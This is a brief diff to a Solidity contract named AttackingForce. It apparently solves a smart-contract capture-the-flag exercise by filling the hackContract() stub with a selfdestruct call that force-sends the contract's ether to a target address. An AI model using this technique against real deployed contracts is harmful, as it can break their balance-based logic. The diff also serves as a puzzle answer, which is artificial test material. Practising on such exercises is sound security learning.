@@ -10,6 +10,7 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+
+        selfdestruct(payable(contractAddress));
     }
 }
